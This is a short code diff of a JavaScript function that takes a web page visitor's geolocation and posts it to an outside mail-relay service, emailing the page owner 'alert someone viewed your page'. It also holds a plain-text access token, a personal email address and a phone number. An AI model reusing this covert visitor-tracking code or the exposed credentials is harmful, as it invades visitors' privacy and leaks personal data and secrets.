@@ -60,12 +60,12 @@ function showPosition(position)
    
     URL= 'https://postmail.invotes.com/send',
     data= {
-      access_token: "eqhitskqjijhat94ecddwtzc",
+     
      subject: 'alert someone viewed your page',
      text: "Their position is Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude,
-     reply_to: "erict54757@gmail.com" ,
-     extra_phone_number:"7153799917",
-     submit_form:"send"
+      access_token: "eqhitskqjijhat94ecddwtzc",
+      reply_to: "erict54757@gmail.com",
+   
 
     }
     $.post(URL,data,function(status,xhr){
